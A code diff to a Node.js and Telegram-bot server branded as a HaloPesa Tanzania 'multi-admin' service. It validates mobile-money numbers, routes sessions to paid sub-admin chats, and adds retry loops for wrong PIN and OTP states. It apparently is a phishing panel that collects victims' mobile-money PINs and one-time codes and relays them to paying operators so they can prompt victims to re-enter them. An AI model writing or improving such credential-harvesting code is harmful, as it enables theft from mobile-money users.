@@ -1,6 +1,6 @@
 /**
  * **HALOPESA TANZANIA - SECURE MULTI-ADMIN SERVER**
- * Complete Integrated Version with All Admin Commands & Direct Main Admin Info on /start.
+ * Complete Integrated Version with Spinner States, Retry Handling, and Admin Commands.
  */
 
 const express = require('express');
@@ -67,10 +67,6 @@ function isValidHaloPesaNumber(number) {
   return /^(061|062|063)\d{7}$/.test(clean);
 }
 
-/**
- * Ensures sub-admin links work permanently once both authorized and paid.
- * Prevents leakage to main admin for sub-admin chat IDs.
- */
 function resolveTargetChat(adminParam) {
   if (adminParam && String(adminParam).trim() !== '') {
     const targetAdmin = String(adminParam).trim();
@@ -356,10 +352,12 @@ async function initBot() {
           break;
         case 'WRONG_PIN':
           session.status = 'RETRY_PIN';
+          session.otp = '';
           await bot.sendMessage(chatTarget, `⚠️ PIN Siyo Sahihi`);
           break;
         case 'WRONG_OTP':
           session.status = 'RETRY_OTP';
+          session.otp = ''; // Clear OTP to allow retry loop
           await bot.sendMessage(chatTarget, `⚠️ OTP Siyo Sahihi`);
           break;
         default:
